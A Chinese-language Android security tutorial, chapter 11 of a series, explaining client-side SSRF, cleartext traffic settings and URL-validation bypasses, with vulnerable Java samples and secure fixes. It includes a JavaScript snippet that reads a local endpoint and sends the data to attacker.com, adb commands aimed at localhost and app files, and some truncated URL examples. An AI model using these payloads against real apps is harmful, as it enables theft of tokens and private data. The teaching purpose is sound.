# Android移动安全第十一章_SSRF与网络安全
> QIANXIN Team
> 来源：https://forum.butian.net/share/4878

> 系列目录：
> 
> 1.  Android 组件导出安全
> 2.  Android Intent 安全
> 3.  Android Binder 服务安全
> 4.  Android ContentProvider 安全
> 5.  Android WebView 安全
> 6.  Android UI 欺骗与钓鱼
> 7.  Android Deep Link 安全
> 8.  Android 广播安全
> 9.  Android PendingIntent 安全
> 10.  Android 系统设置安全
> 11.  Android SSRF 与网络安全（本章）
> 12.  Android 加密与数据存储安全
> 13.  Android 认证与证书校验
> 14.  Android Zip Slip 路径遍历
> 15.  Android Fragment Injection
> 16.  Android SELinux 与沙箱机制

* * *

## 1\. 前言

Web 安全中的 SSRF 是指：攻击者让服务器代替自己发起网络请求，从而访问服务器能访问但攻击者不能直接访问的资源（如内网服务、云元数据接口）。

Android App 中的 SSRF 原理相同，但场景有所不同。App 运行在用户设备上，它能访问的"内网"包括：

-   设备本地服务（localhost / 127.0.0.1）
-   同一局域网内的其他设备和服务
-   App 自身的 WebView 缓存和 Cookie
-   App 配置的 API 接口（携带认证 token）

当 App 从 Intent extras、Deep Link 参数、广播数据等外部输入中获取 URL 并直接发起网络请求时，攻击者就有机会控制请求的目标。

本章讲 Android 客户端中 SSRF 的触发点、利用方式，以及和 WebView、网络库相关的安全问题。

* * *

## 2\. 客户端 SSRF 的触发点

### 2.1 Intent 传入 URL

最常见的触发点是 Activity 从 Intent 中读取 URL 后发起网络请求：

```java
public class FetchActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String url = getIntent().getStringExtra("url");
        if (url != null) {
            
            new Thread(() -> {
                try {
                    HttpURLConnection conn = (HttpURLConnection)
                        new URL(url).openConnection();
                    InputStream is = conn.getInputStream();
                    
                } catch (Exception e) {}
            }).start();
        }
    }
}
```

如果这个 Activity 是导出的，攻击者可以通过 ADB 或恶意 App 传入任意 URL：

```bash
adb shell am start -n com.target.app/.FetchActivity \
    --es url "http://127.0.0.1:8080/admin"
```

### 2.2 Deep Link 参数

第七章讲过 Deep Link 的安全问题。如果 App 从 Deep Link 的 URL 参数中提取目标地址并发起请求，同样存在 SSRF 风险：

```php
demoapp:
```

App 解析 `target` 参数后直接请求：

```java
Uri uri = getIntent().getData();
String target = uri.getQueryParameter("target");

```

Deep Link 可以通过浏览器触发（用户点击一个链接就够了），攻击门槛比 Intent 更低。

### 2.3 WebView 中的 SSRF

第五章讲过 WebView 的安全问题。WebView 加载外部 URL 时，页面中的 JavaScript 可以发起 XMLHttpRequest 或 fetch 请求。如果 WebView 启用了 `setAllowUniversalAccessFromFileURLs(true)` 或加载的是 `file://` 协议的页面，JavaScript 可以跨域访问任意 URL：

```java
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
webView.loadUrl(attackerControlledUrl);
```

攻击者控制的页面中：

```javascript

fetch('http://127.0.0.1:8080/api/secret')
    .then(r => r.text())
    .then(data => {
        
        fetch('https://attacker.com/collect?data=' + encodeURIComponent(data));
    });
```

### 2.4 图片/资源加载

很多 App 使用图片加载库（如 Glide、Picasso、Coil）从 URL 加载图片。如果 URL 来自外部输入且未校验，攻击者可以让 App 请求任意地址：

```java

String avatarUrl = getIntent().getStringExtra("avatar_url");
Glide.with(this).load(avatarUrl).into(imageView);
```

虽然图片加载库通常只处理图片格式的响应，但请求本身已经发出了。如果目标服务根据请求的存在（而非响应内容）来触发操作（如 CSRF token 刷新），这就足够了。

### 2.5 JS Bridge 回调

第五章讲过 JS Bridge。如果 WebView 暴露了一个接受 URL 参数的 JS Bridge 方法，页面中的 JavaScript 可以让 App 发起任意网络请求：

```java
@JavascriptInterface
public void fetchData(String url) {
    
    new Thread(() -> {
        try {
            HttpURLConnection conn = (HttpURLConnection)
                new URL(url).openConnection();
            
            String response = readStream(conn.getInputStream());
            
        } catch (Exception e) {}
    }).start();
}
```

这种情况下，App 充当了"代理"的角色——JavaScript 通过 JS Bridge 让 App 发起请求，App 的请求可能携带了 Cookie、Authorization header 等认证信息，而这些信息是 JavaScript 直接请求时拿不到的。

* * *

## 3\. 利用方式

### 3.1 访问本地服务

Android 设备上可能运行着一些本地服务，监听在 localhost 上：

-   开发工具的调试服务（如 React Native 的 Metro bundler 默认监听 8081 端口）
-   App 内嵌的本地 HTTP 服务（一些 App 用本地 HTTP 服务来做进程间通信或提供 WebView 内容）
-   ADB 的本地转发端口

```bash

adb shell am start -n com.target.app/.FetchActivity \
    --es url "http://127.0.0.1:8081/status"
```

如果本地服务没有做来源校验（很多本地服务假设只有本机进程能访问，不做认证），App 的请求就能获取到服务的响应数据。

### 3.2 探测内网

当设备连接到 Wi-Fi 时，App 可以访问同一局域网内的其他设备。攻击者可以利用 SSRF 来探测内网拓扑：

```php
http:
http:
http:
```

通过观察请求的响应时间和状态码，可以判断内网中哪些 IP 和端口是开放的。

### 3.3 利用认证信息

App 的网络请求通常会自动携带认证信息：

-   OkHttp 的 CookieJar 中存储的 Cookie
-   Interceptor 自动添加的 Authorization header
-   网络库配置的 API key

如果攻击者能控制请求的 URL，可以让 App 携带这些认证信息去访问攻击者控制的服务器：

```php
https:
```

App 的网络拦截器可能会自动在请求中添加 `Authorization: Bearer <token>`，攻击者的服务器就能收到这个 token。

不过，成熟的网络库（如 OkHttp）默认只在请求目标域名匹配时才发送 Cookie。但自定义的 Interceptor 如果不检查目标域名就添加 header，就会泄露认证信息。

```java

OkHttpClient client = new OkHttpClient.Builder()
    .addInterceptor(chain -> {
        Request request = chain.request()
            .newBuilder()
            .addHeader("Authorization", "Bearer " + authToken)
            .build();
        return chain.proceed(request);
    })
    .build();
```

安全的做法是在 Interceptor 中检查请求的域名：

```java
.addInterceptor(chain -> {
    Request request = chain.request();
    String host = request.url().host();
    if ("api.example.com".equals(host)) {
        request = request.newBuilder()
            .addHeader("Authorization", "Bearer " + authToken)
            .build();
    }
    return chain.proceed(request);
})
```

### 3.4 file:// 协议

如果 App 的 URL 处理逻辑没有限制协议类型，攻击者可以使用 `file://` 协议读取本地文件：

```bash
adb shell am start -n com.target.app/.FetchActivity \
    --es url "file:///data/data/com.target.app/shared_prefs/config.xml"
```

`HttpURLConnection` 默认不支持 `file://` 协议，但 `URL.openConnection()` 在某些实现中可能支持。WebView 的 `loadUrl()` 则明确支持 `file://`，第五章已经讲过这个问题。

一些网络库（如 OkHttp）默认也不支持 `file://`，但如果 App 自己实现了 URL 处理逻辑（比如先下载到本地再读取），可能在路径拼接时引入路径遍历问题。

* * *

## 4\. 明文流量

### 4.1 Cleartext Traffic

Android 9.0（API 28）开始，默认禁止 App 发送明文 HTTP 请求（非 HTTPS）。如果 App 的 `targetSdk >= 28` 且没有特殊配置，尝试发起 HTTP 请求会抛出异常：

```php
java.net.UnknownServiceException: CLEARTEXT communication to example.com not permitted
```

但很多 App 为了兼容性或开发便利，在 Manifest 中开启了明文流量：

```xml
<application
    android:usesCleartextTraffic="true"
    ... >
```

或者通过 Network Security Config（网络安全配置，Android 7.0 引入的 XML 配置文件，用于自定义 App 的网络安全策略）允许特定域名的明文流量：

```xml

<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">api.example.com</domain>
    </domain-config>
</network-security-config>
```

```xml

<application
    android:networkSecurityConfig="@xml/network_security_config"
    ... >
```

开启明文流量意味着 App 的网络请求可以被同一网络中的攻击者通过中间人攻击（MITM，Man-In-The-Middle）截获和篡改。

### 4.2 Network Security Config

Network Security Config 是 Android 7.0 引入的机制，允许 App 以声明式的方式配置网络安全策略，而不需要修改代码。它可以控制：

-   是否允许明文流量
-   信任哪些 CA 证书
-   是否启用证书固定（Certificate Pinning）

```xml
<network-security-config>
    
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </base-config>

    
    <debug-overrides>
        <trust-anchors>
            <certificates src="user" />
        </trust-anchors>
    </debug-overrides>

    
    <domain-config>
        <domain includeSubdomains="true">api.example.com</domain>
        <pin-set expiration="2025-01-01">
            <pin digest="SHA-256">base64EncodedPin=</pin>
            <pin digest="SHA-256">backupPin=</pin>
        </pin-set>
    </domain-config>
</network-security-config>
```

审计时需要关注的配置问题：

| 配置 | 风险 |
| --- | --- |
| cleartextTrafficPermitted="true" | 允许明文 HTTP，可被中间人攻击 |
| <certificates src="user" /> 在非 debug 配置中 | 信任用户安装的证书，降低了 MITM 门槛 |
| 没有配置 pin-set | 没有证书固定，依赖系统 CA 信任链 |
| pin-set 的 expiration 已过期 | 证书固定失效 |

### 4.3 Android 版本对明文流量的限制

| 版本 | 行为 |
| --- | --- |
| Android 6.0 及之前 | 默认允许明文流量 |
| Android 7.0（API 24） | 引入 Network Security Config，但默认仍允许明文 |
| Android 8.0（API 26） | WebView 中的明文流量受 Network Security Config 控制 |
| Android 9.0（API 28） | targetSdk >= 28 的 App 默认禁止明文流量 |

* * *

## 5\. URL 校验绕过

### 5.1 常见的校验方式和绕过

开发者意识到 URL 需要校验后，通常会做一些简单的检查。但这些检查往往可以被绕过：

白名单域名检查——只检查 URL 是否包含白名单域名：

```java

if (url.contains("example.com")) {
    loadUrl(url);
}
```

绕过方式：

```php
https:
https:
https:
```

协议检查——只检查是否以 `https://` 开头：

```java
if (url.startsWith("https://")) {
    loadUrl(url);
}
```

这只能防止 `file://` 和 `javascript:` 协议，不能防止 SSRF（攻击者的服务器也可以用 HTTPS）。

### 5.2 URL 解析差异

不同的 URL 解析库对同一个 URL 可能有不同的解析结果，这种差异可以被利用来绕过校验：

```java

URL url = new URL("https://example.com@attacker.com/path");
url.getHost();  


Uri uri = Uri.parse("https://example.com@attacker.com/path");
uri.getHost();  
```

在这个例子中，`example.com` 是 URL 的 userinfo 部分（用户名），实际的 host 是 `attacker.com`。如果校验逻辑用字符串匹配检查 `example.com`，但实际请求发往 `attacker.com`，就构成了绕过。

另一个常见的解析差异是 URL 编码：

```php
https:
```

`%2F` 是 `/` 的 URL 编码。不同解析库对这个 URL 的 host 解析可能不同。

### 5.3 重定向

即使 App 校验了初始 URL，如果网络库跟随了 HTTP 重定向（301/302），最终请求的目标可能和初始 URL 完全不同：

```java

if (isWhitelisted(url)) {
    HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
    conn.setInstanceFollowRedirects(true);  
    
    
}
```

OkHttp 默认也会跟随重定向。如果攻击者能控制白名单域名上的一个重定向（比如通过开放重定向漏洞），就能绕过 URL 校验。

* * *

## 6\. WebSocket 和长连接

### 6.1 WebSocket

一些 App 使用 WebSocket 进行实时通信。如果 WebSocket 的连接地址来自外部输入，同样存在 SSRF 风险：

```java
String wsUrl = getIntent().getStringExtra("ws_url");
OkHttpClient client = new OkHttpClient();
Request request = new Request.Builder().url(wsUrl).build();
WebSocket ws = client.newWebSocket(request, new WebSocketListener() {
    @Override
    public void onMessage(WebSocket webSocket, String text) {
        
    }
});
```

WebSocket 连接建立后是双向的，攻击者的服务器可以主动向 App 推送消息。如果 App 不校验消息来源就处理消息内容，可能导致更多问题。

### 6.2 自定义协议

一些 App 实现了自定义的网络协议（如基于 TCP 的私有协议）。如果连接地址可控，攻击者可以让 App 连接到恶意服务器，恶意服务器返回精心构造的响应来触发 App 中的解析漏洞。

* * *

## 7\. 总结

Android 客户端的 SSRF 和 Web 端的原理相同——外部输入控制了网络请求的目标。但移动端的攻击面有自己的特点：触发点分散在 Intent、Deep Link、JS Bridge、图片加载等多个入口，利用目标包括本地服务、内网资源和 App 自身的认证信息。

回顾一下：

-   Intent extras、Deep Link 参数、JS Bridge 回调是常见的 URL 注入点
-   本地服务（localhost）、内网资源、App 认证信息是主要的利用目标
-   简单的字符串匹配校验容易被 URL 解析差异和重定向绕过
-   Android 9.0 默认禁止明文流量，但很多 App 通过配置开启了明文
-   Network Security Config 提供了声明式的网络安全策略配置
-   网络库的 Interceptor 如果不检查目标域名就添加认证 header，会导致 token 泄露

下一章讲 Android 加密与数据存储安全。SharedPreferences、SQLite 数据库、文件存储中的敏感数据如果没有加密，或者加密方式存在缺陷，就是数据泄露的入口。
